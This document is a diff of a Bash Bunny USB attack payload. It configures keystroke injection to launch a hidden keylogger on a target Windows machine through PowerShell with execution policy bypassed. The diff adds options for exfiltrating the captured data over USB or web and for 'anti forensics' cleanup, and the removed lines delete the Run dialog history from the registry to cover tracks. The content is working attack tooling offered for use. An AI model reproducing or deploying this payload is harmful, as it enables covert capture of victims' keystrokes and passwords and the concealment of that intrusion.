@@ -1,31 +1,48 @@
 # ----- SETTINGS -----
-
 # Set this to the keyboard of your target machine
-KEYBOARD_LAYOUT="us"
+KEYBOARD_LAYOUT="de"
+
+# Set this to the name of your BashBunny
+BUNNY_NAME="BashBunny"
 
 # May be useful when combined with an social engineering attack (So the target doesn't relate the popups to the usb stick)
 PRE_DELAY="0"
 
-# Advanced anti forensics... Just trust me :D
-CLEANUP="yes"
+# Set the exfil method here (Types: USB, WEB (experimental), and SMB (not implemented yet))
+# WEB requires you to set the backend's URI in the powershell script
+EXFIL_METHOD="USB"
 
-# ----- PAYLOAD ------
+# Advanced anti forensics... Just trust me :D (1 = Enabled; 0 = Disabled)
+CLEANUP=1
+
+# ----- FUNCTIONS ----
+
+function optimizeExfil()
+{
+	case $1 in
+		USB)
+		export EXFIL_METHOD="u"
+		;;
+		WEB)
+		export EXFIL_METHOD="w"
+		;;
+		SMB)
+		export EXFIL_METHOD="s"
+		;;
+	esac
+}
+
+# ----- PAYLOAD -----
 LED SETUP
 DUCKY_LANG $KEYBOARD_LAYOUT
+optimizeExfil $EXFIL_METHOD
 
 ATTACKMODE HID STORAGE
 Q DELAY $PRE_DELAY
 
 LED ATTACK
-# Launch keylogger
-RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\b.cmd')"
 
-# The part no one wants to do
-if [ "$CLEANUP" == "yes" ]
-then
-	LED STAGE2
-	Q DELAY 2000 # Wait for the powershell to be vanished
-	RUN WIN REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
-fi
+# Launch keylogger (thanks to jafahulo)
+RUN WIN powershell -NoP -NonI -W Hidden -Exec Bypass ".((gwmi win32_volume -f 'label=''$BUNNY_NAME''').Name+'payloads\\$SWITCH_POSITION\l.ps1') $CLEANUP $EXFIL_METHOD"
 
 LED FINISH
